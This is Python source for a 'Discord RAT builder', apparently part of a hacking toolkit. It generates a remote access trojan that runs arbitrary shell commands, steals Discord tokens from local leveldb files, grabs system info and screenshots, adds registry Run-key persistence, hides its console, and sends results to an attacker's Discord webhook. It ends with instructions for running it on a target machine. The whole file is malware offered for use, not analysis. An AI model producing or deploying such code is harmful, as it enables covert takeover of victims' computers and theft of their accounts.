import os, sys, time, base64, random, string

def run():
    print("\n" + "="*60)
    print("DISCORD RAT BUILDER")
    print("="*60)
    
    print("[!] This creates a Remote Access Tool controlled via Discord webhook")
    print("[!] Commands: shell [cmd], tokens, sysinfo, screenshot")
    print("[!] The RAT will check the webhook every 5 seconds for commands")
    print("="*60)
    
    webhook = input("\nWebhook URL: ").strip()
    
    if not webhook.startswith('https://discord.com/api/webhooks/'):
        print("\n[!] Invalid webhook URL!")
        print("[!] Format: https://discord.com/api/webhooks/ID/TOKEN")
        input("\nPress Enter to continue...")
        return
    
    filename = input("Filename [discord_rat]: ").strip() or "discord_rat"
    
    print("\n[+] Building Discord RAT...")
    
    # Generate a random XOR key for encryption
    xor_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    
    code = f'''#!/usr/bin/env python3
# Discord RAT - Controlled via Webhook

import requests, subprocess, os, time, sys, platform, glob, re, base64, json, threading, ctypes

WEBHOOK = "{webhook}"
IS_WIN = platform.system() == "Windows"
_XOR_KEY = b'{xor_key}'

def xor_crypt(data):
    return bytes([data[i] ^ _XOR_KEY[i % len(_XOR_KEY)] for i in range(len(data))])

def encrypt_cmd(cmd):
    return base64.b64encode(xor_crypt(cmd.encode())).decode()

def decrypt_cmd(data):
    return xor_crypt(base64.b64decode(data)).decode()

def send(data):
    try:
        # Split long messages
        if len(data) > 1900:
            for i in range(0, len(data), 1900):
                requests.post(WEBHOOK, json={{'content': data[i:i+1900]}})
        else:
            requests.post(WEBHOOK, json={{'content': data}})
    except:
        pass

def execute_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if not output:
            output = "[+] Command executed successfully (no output)"
        return output[:4000]
    except subprocess.TimeoutExpired:
        return "[!] Command timed out"
    except Exception as e:
        return f"[!] Error: {{str(e)}}"

def steal_tokens():
    tokens = []
    paths = []
    if IS_WIN:
        paths = glob.glob(os.path.expandvars("%APPDATA%\\\\discord\\\\Local Storage\\\\leveldb\\\\*.log"))
        paths += glob.glob(os.path.expandvars("%APPDATA%\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\*.log"))
        paths += glob.glob(os.path.expandvars("%APPDATA%\\\\discordptb\\\\Local Storage\\\\leveldb\\\\*.log"))
    else:
        paths = glob.glob(os.path.expanduser("~/.config/discord/Local Storage/leveldb/*.log"))
        paths += glob.glob(os.path.expanduser("~/.config/discordcanary/Local Storage/leveldb/*.log"))
        paths += glob.glob(os.path.expanduser("~/.config/discordptb/Local Storage/leveldb/*.log"))
    
    for p in paths:
        if os.path.exists(p):
            try:
                with open(p, 'r', errors='ignore') as f:
                    for line in f:
                        matches = re.findall(r'[\\w-]{{24,}}\\.[\\w-]{{6,}}\\.[\\w-]{{27,}}', line)
                        tokens.extend(matches)
            except:
                pass
    
    return list(set(tokens))

def get_system_info():
    info = f"""
=== SYSTEM INFORMATION ===
OS: {{platform.system()}} {{platform.release()}}
Hostname: {{platform.node()}}
User: {{os.getlogin()}}
CPU: {{os.cpu_count()}} cores
Python: {{sys.version}}
Architecture: {{platform.machine()}}
Working Directory: {{os.getcwd()}}
"""
    if IS_WIN:
        try:
            import psutil
            info += f"RAM: {{psutil.virtual_memory().total / 1024**3:.2f}} GB"
        except:
            pass
    return info

def take_screenshot():
    try:
        import PIL.ImageGrab
        img = PIL.ImageGrab.grab()
        img_path = os.path.join(os.environ.get('TEMP', '/tmp'), 'screenshot.png')
        img.save(img_path)
        
        with open(img_path, 'rb') as f:
            import base64
            return base64.b64encode(f.read()).decode()
    except:
        return "[!] Screenshot failed"

def persist_windows():
    if not IS_WIN:
        return
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "DiscordRAT", 0, winreg.REG_SZ, sys.executable + " " + __file__)
        winreg.CloseKey(handle)
    except:
        pass

def main():
    # Hide console on Windows
    if IS_WIN:
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    # Send startup notification
    try:
        send(f"[+] RAT Started on {{platform.node()}}")
    except:
        pass
    
    while True:
        try:
            # Check for commands
            r = requests.get(WEBHOOK, timeout=5)
            if r.status_code == 200 and r.text:
                cmd = r.text.strip()
                
                # Process commands
                if cmd.startswith('shell '):
                    result = execute_cmd(cmd[6:])
                    send(result)
                    
                elif cmd == 'tokens':
                    tokens = steal_tokens()
                    if tokens:
                        send(f"Tokens found: {{len(tokens)}}\\n" + "\\n".join(tokens))
                    else:
                        send("[!] No tokens found")
                        
                elif cmd == 'sysinfo':
                    info = get_system_info()
                    send(info)
                    
                elif cmd == 'screenshot':
                    img = take_screenshot()
                    if img:
                        send(f"[+] Screenshot captured\\n{{img[:500]}}...")
                    else:
                        send("[!] Screenshot failed")
                        
                elif cmd == 'persist':
                    persist_windows()
                    send("[+] Persistence enabled")
                    
                elif cmd == 'help':
                    help_text = """
=== DISCORD RAT COMMANDS ===
shell [cmd]  - Execute system command
tokens       - Steal Discord tokens
sysinfo      - Get system information
screenshot   - Take screenshot
persist      - Enable persistence
help         - Show this help
"""
                    send(help_text)
                    
                elif cmd == 'exit':
                    send("[!] RAT shutting down...")
                    sys.exit(0)
                    
                else:
                    send(f"[!] Unknown command: {{cmd}}\\nType 'help' for commands")
                    
        except Exception as e:
            time.sleep(5)
        
        time.sleep(5)

if __name__ == "__main__":
    main()
'''
    
    # Save the RAT
    out_dir = os.path.expanduser("~/Downloads/BlackTiger_Output")
    os.makedirs(out_dir, exist_ok=True)
    
    py_path = os.path.join(out_dir, filename + ".py")
    with open(py_path, 'w') as f:
        f.write(code)
    
    print(f"\n[+] RAT saved to: {py_path}")
    
    # Create a BAT file for easy execution
    bat_path = os.path.join(out_dir, filename + ".bat")
    with open(bat_path, 'w') as f:
        f.write(f'''@echo off
echo Starting Discord RAT...
python "{py_path}"
pause
''')
    
    print(f"[+] Batch file saved to: {bat_path}")
    
    print("\n" + "="*60)
    print("HOW TO USE")
    print("="*60)
    print("1. Run the RAT on the target machine:")
    print(f"   python {filename}.py")
    print("\n2. Send commands via webhook:")
    print("   - Go to your Discord webhook URL")
    print("   - Send a message with the command")
    print("\n3. Available commands:")
    print("   shell [cmd]  - Execute system command")
    print("   tokens       - Steal Discord tokens")
    print("   sysinfo      - Get system information")
    print("   screenshot   - Take screenshot")
    print("   persist      - Enable persistence")
    print("   help         - Show help")
    print("   exit         - Stop the RAT")
    print("="*60)
    
    input("\nPress Enter to continue...")

if __name__ == "__main__":
    run()
